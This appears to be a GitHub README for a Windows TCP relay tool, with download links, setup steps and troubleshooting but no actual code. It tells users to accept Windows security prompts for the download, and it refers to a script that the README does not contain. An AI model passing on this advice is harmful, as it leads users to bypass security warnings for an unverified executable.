# 🧩 TCP-preconnection-relay - Faster TCP handshakes with less delay

[⬇️ Download TCP-preconnection-relay](https://github.com/toddiediestrual35/TCP-preconnection-relay)

## 🚀 What it does

TCP-preconnection-relay is a small Windows tool for TCP forwarding with preconnection support. It helps cut the wait time between the source side and the target side by keeping the path ready before traffic starts.

Use it when you want a simple relay that starts fast and keeps the connection path warm. It is built for users who want less delay without tuning a lot of settings.

## 📥 Download

Visit this page to download: https://github.com/toddiediestrual35/TCP-preconnection-relay

After you open the page, look for the latest release or the main download file. Save it to your Windows PC.

## 🪟 System requirements

- Windows 10 or Windows 11
- Internet access for the first download
- Permission to run local apps
- Basic support for TCP connections on your network

A normal home or office PC is enough. You do not need a server grade machine.

## 🧭 Before you start

Have these details ready:

- The address of the local port you want to listen on
- The destination host or IP
- The destination port
- Any login or network rule that applies to your path

If you used this tool before, copy the new script from this README again before you run it.

## ⚙️ Setup

1. Open the download page.
2. Get the file or package for Windows.
3. Save it in a folder you can find again, such as Downloads or Desktop.
4. If the file is in a ZIP package, extract it.
5. Keep the app file and this README in the same place if the package includes both.

## ▶️ Run it on Windows

1. Open the folder where you saved the app.
2. Double-click the program file or the script file.
3. If Windows asks for permission, choose Allow or Yes.
4. Copy your relay settings into the app or script as needed.
5. Start the relay.
6. Leave the window open while you use it.

If the app opens in a console window, that is normal. The window shows the relay status and any connection messages.

## 📝 Basic use

A common setup has three parts:

- Local listen port: the port your apps connect to
- Target host: the remote server you want to reach
- Target port: the port on that remote server

When the relay starts, it listens on the local port. It then prepares the TCP path ahead of time so the real connection can begin with less wait.

Example use cases:

- Remote app access
- Game traffic relay
- Service forwarding
- Quick path setup for a fixed destination

## 🔧 How to choose values

Use values that match your network:

- Pick a local port that is free, such as 1080, 2080, or 3000
- Use the real server address for the target host
- Match the target port to the service you want to reach
- Keep the same settings each time if you want stable results

If another app already uses the local port, choose a different one.

## 📌 What you may see

When the relay runs well, you may see:

- A line that says it is listening
- A line that shows the target path is ready
- Messages about new connections
- Messages about closed connections

If the target server is not reachable, the app may show a failed connect message. Check the host, port, and network path, then try again.

## 🧱 Troubleshooting

### Port is already in use

Pick another local port. Close the app that already uses that port, then start TCP-preconnection-relay again.

### The target does not open

Check the destination host and port. Make sure the server is online and that your network allows the connection.

### Windows blocks the app

Right-click the file and run it again with the proper permission. If your system shows a security prompt, allow the app to run.

### The relay starts but nothing connects

Make sure your client app connects to the local listen port, not the remote target port. The relay must sit between the client and the target.

## 🗂️ File layout

A typical package may include:

- The app file or script
- A README file
- A sample config or sample command
- A log file after first run

Keep the files together if the package depends on them.

## 🔒 Safety and network notes

Only forward traffic to systems you trust and manage. Use ports and paths that fit your own network rules. If you run this on a work or school network, follow the local policy for TCP forwarding.

## ❓ Common questions

### Do I need coding skills?

No. You only need to download the file, open it, and fill in the local port and target address.

### Can I use it on more than one machine?

Yes, if each machine has its own settings and network access.

### Does it work in the background?

It can stay open while you use it. If you close the window, the relay stops.

### Can I change the port later?

Yes. Stop the app, change the listen port or target values, then start it again.

## 📎 Quick start

1. Open the download page: https://github.com/toddiediestrual35/TCP-preconnection-relay
2. Download the Windows file.
3. Save and extract it if needed.
4. Open the app or script.
5. Enter your local port, target host, and target port.
6. Start the relay.
7. Keep the window open while you use it